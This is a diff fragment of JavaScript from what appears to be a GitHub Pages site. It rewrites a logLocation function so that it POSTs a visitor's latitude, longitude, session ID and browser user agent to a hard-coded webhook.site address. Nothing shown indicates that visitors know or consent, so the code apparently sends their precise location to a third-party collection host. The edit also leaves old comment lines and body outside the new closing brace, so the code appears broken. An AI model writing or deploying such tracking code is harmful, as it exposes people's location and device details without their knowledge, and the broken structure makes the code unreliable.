@@ -70,14 +70,27 @@
 
     // Free logging via webhook.site
     async function logLocation(sessionId, type, lat, lng) {
-        const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
-        const data = {
-            sessionId,
-            type,
-            lat,
-            lng,
-            timestamp: new Date().toISOString()
-        };
+  const webhookURL = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
+  const data = {
+    sessionId,
+    type,
+    lat,
+    lng,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
+  };
+  
+  try {
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    });
+    console.log("Data logged successfully");
+  } catch (error) {
+    console.error("Logging failed:", error);
+  }
+}
         
         // Send data (won't work in GitHub Pages due to CORS)
         // This is just for demonstration - we'll use manual logging
